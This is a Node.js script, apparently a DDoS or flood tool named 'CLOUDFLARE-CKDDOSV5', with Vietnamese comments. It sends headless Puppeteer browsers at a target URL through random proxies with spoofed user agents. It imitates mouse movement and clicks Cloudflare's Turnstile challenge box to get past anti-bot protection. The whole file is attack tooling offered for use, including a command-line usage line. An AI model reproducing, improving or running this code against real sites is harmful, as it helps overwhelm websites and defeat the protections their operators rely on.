const fs = require('fs');
const axios = require('axios');
const puppeteer = require('puppeteer');
const colors = require('colors');
const randomUserAgent = require('random-user-agent');

// Mang User-Agent đay đu
const uaList = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0',
    'Mozilla/5.0 (Windows NT 5.1; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Mozilla/5.0 (Mobile; rv:40.0) Gecko/40.0 Firefox/40.0',
    'Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KRT16S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48',
    'Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.77 Mobile Safari/537.36',
    'Mozilla/5.0 (Android 10; Mobile; rv:79.0) Gecko/79.0 Firefox/79.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 OPR/34.0.2036.25',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/75.0.3969.149',
];

// Ham random User-Agent
function randomUA() {
    return uaList[Math.floor(Math.random() * uaList.length)];
}

// Ham log voi thoi gian
function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    console.log(`(${hours}:${minutes}:${seconds})`.white + ` - ${string}`);
}

// Ham đe chon proxy ngau nhien
function randomProxy(proxyFile) {
    const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n');
    return proxies[Math.floor(Math.random() * proxies.length)].trim();
}

// Ham tao trinh duyet Puppeteer
async function createBrowser(proxy) {
    const browser = await puppeteer.launch({
        headless: true, // Chạy ở chế độ headless
        args: [
            `--proxy-server=${proxy}`,
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ]
    });
    return browser;
}

// Ham xu ly captcha
async function captchaSolver(page) {
    log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Detected protection -> ` + `CloudFlare (JS)`.green);

    for (let i = 0; i < 15; i++) {
        await page.waitForTimeout(1000);
        await page.mouse.move(Math.floor(Math.random() * 230), Math.floor(Math.random() * 230));
    }

    if (await page.title() === "Just a moment...") {
        const hcaptcha_box = await page.$('#turnstile-wrapper div');

        if (hcaptcha_box) {
            let x, y;
            let captchaDetected = false;

            try {
                const rect = await hcaptcha_box.boundingBox();
                if (!rect) throw new Error("boundingBox is null");

                x = rect.x + rect.width / 2;
                y = rect.y + rect.height / 2;

                log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Managed challenge -> ` + `Detected captcha`.green);
                log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Detected element -> ` + `[ captcha box ]`.green);

                captchaDetected = true;
            } catch (e) {
                log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Managed challenge -> ` + `UAM (no captcha box)`.green);
                await page.waitForTimeout(15000);
            }

            if (captchaDetected) {
                let attempts = 0;

                while (await page.title() === "Just a moment..." && attempts < 7) {
                    await page.mouse.click(x, y);
                    log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Element clicked -> ` + `[ captcha box ]`.green);
                    await page.waitForTimeout(10000);
                    attempts++;
                }
            }
        }
    } else {
        log(`(${'CLOUDFLARE-CKDDOSV5'.green}) Managed challenge -> ` + `UAM`.green);
        await page.waitForTimeout(15000);
    }

    const title = await page.title();
    return title;
}

// Ham hien thi thong tin truoc khi bat dau
function showStartPanel(url, threads, delay, maxTime) {
    const startTime = new Date();
    const formattedStartTime = `${startTime.getHours()}:${startTime.getMinutes()}:${startTime.getSeconds()}`;
    console.log(`\n===================`.yellow);
    console.log(`Start Time: ${formattedStartTime}`.cyan);
    console.log(`Website: ${url}`.magenta);
    console.log(`Threads: ${threads}`.green);
    console.log(`Delay: ${delay} ms`.blue);
    console.log(`Max Time: ${maxTime} ms`.red);
    console.log("====================".yellow);
    console.log('Developed by: '.bold + 'Thanh Tung'.green);
    console.log("====================".yellow);
    console.log('\nStarting the process...'.yellow);
}

// Main function
async function main(url, threads, delay, maxRetries, proxyFile, maxTime) {
    showStartPanel(url, threads, delay, maxTime);
    
    const startTime = Date.now();

    for (let i = 0; i < threads; i++) {
        if (Date.now() - startTime > maxTime) {
            log(`Max time reached. Stopping execution.`);
            break; // Dừng quá trình nếu hết thời gian
        }

        const proxy = randomProxy(proxyFile);
        let retries = 0;
        let browser;

        while (retries < maxRetries) {
            try {
                browser = await createBrowser(proxy);
                const page = await browser.newPage();
                await page.setUserAgent(randomUA());
                await page.goto(url, { waitUntil: 'domcontentloaded' });

                // Handle captcha
                await captchaSolver(page);

                log(`Thread ${i + 1}: Finished processing for ${url}`);
                await browser.close();
                break; // Break the loop on success
            } catch (err) {
                retries++;
                if (retries === maxRetries) {
                    log(`Thread ${i + 1}: Failed after ${maxRetries} attempts.`);
                } else {
                    log(`Thread ${i + 1}: Retry attempt ${retries}`);
                }
            }
        }
    }

    const endTime = Date.now();
    const elapsedTime = (endTime - startTime) / 1000;  // time in seconds
    console.log(`\nProcess finished in ${elapsedTime.toFixed(2)} seconds.`.green);
}

// Lay cac tham so tu dong lenh
const [,, url, threads, delay, maxRetries, proxyFile, maxTime] = process.argv;

// Validate inputs
if (!url || !threads || !delay || !maxRetries || !proxyFile || !maxTime) {
    console.log('Usage: node tung.js <url> <threads> <delay> <maxRetries> <proxyFile> <maxTime>');
    process.exit(1);
}

// Chay main function
main(url, parseInt(threads), parseInt(delay), parseInt(maxRetries), proxyFile, parseInt(maxTime));
